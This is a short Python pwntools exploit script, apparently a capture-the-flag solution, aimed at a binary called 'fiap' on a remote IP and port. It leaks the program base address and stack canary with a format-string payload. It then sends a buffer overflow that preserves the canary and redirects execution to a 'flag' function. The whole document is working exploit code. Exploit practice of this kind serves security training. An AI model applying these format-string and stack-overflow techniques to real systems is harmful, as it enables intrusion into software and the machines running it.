from pwn import *

elf = ELF('./fiap')
#r = process( elf.path )
r = remote("88.198.219.20",43174 )

payload = b''
payload = b'%3$p %11$p'

r.recvuntil("ame?\n")
r.sendline( payload )

r.recvuntil('you, ')
elf_base = int( r.recvuntil(' '), 16 ) - elf.symbols["say_hi"] - 13
canary = int( r.recvuntil('!\n')[:-2], 16 )

info( 'elf_base : %s', hex( elf_base ))
info( 'canary : %s', hex( canary ) )

r.recvuntil('cake?\n')
r.sendline (b'A'*(0x19) + p32(canary) + b'BBBB'* 3 + p32( elf_base + elf.symbols["flag"] ) )

r.interactive()
